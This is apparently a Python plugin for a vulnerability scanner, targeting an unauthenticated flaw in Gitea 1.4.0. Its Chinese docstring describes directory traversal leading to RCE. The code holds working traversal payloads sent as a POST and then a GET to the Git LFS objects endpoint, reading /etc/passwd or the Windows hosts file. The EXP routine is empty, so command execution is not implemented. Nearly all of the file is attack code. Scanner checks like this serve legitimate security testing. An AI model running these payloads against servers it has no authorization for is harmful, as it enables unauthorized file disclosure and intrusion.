#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Gitea是从gogs衍生出的一个开源项目, 是一个类似于Github、Gitlab的多用户Git仓库管理平台
    Gitea 1.4.0 未授权访问, 综合漏洞(目录穿越, RCE等)
        暂无编号
            Payload: https://vulhub.org/#/environments/gitea/1.4-rce/

其1.4.0版本中有一处逻辑错误, 导致未授权用户可以穿越目录, 读写任意文件, 最终导致执行任意命令
'''

from lib.tool import check
from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {
                'path': '.git/info/lfs/objects',
                'data': '''{"Oid": "....../../../etc/passwd","Size": 1000000,"User" : "a","Password" : "a","Repo" : "a","Authorization" : "a"}''',
                'path-2': '.git/info/lfs/objects/%2e%2e%2e%2e%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd/a',
            },
            {
                'path': '.git/info/lfs/objects',
                'data': '''{"Oid": "....../../../C:/Windows/System32/drivers/etc/hosts","Size": 1000000,"User" : "a","Password" : "a","Repo" : "a","Authorization" : "a"}''',
                'path-2': '.git/info/lfs/objects/%2e%2e%2e%2e%2e%2e%2F%2e%2e%2F%2e%2e%2FC:%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts/a',
            },
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        
        vul_info = {
            'app_name': 'Gitea',
            'vul_type': 'FileRead/RCE',
            'vul_id': 'Gitea-unAuthorized',
        }

        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/vnd.git-lfs+json'
        }

        for payload in self.payloads:
            path = payload['path']
            data = payload['data']

            res1 = client.request(
                'post',
                path,
                data=data,
                headers=headers,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res1 is None:
                continue
            
            path_2 = payload['path-2']

            res2 = client.request(
                'get',
                path_2,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res2 is None:
                continue

            if (check.check_res_fileread(res2.text)):
                results = {
                    'Target': res2.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request-1': res1,
                    'Request-2': res2
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
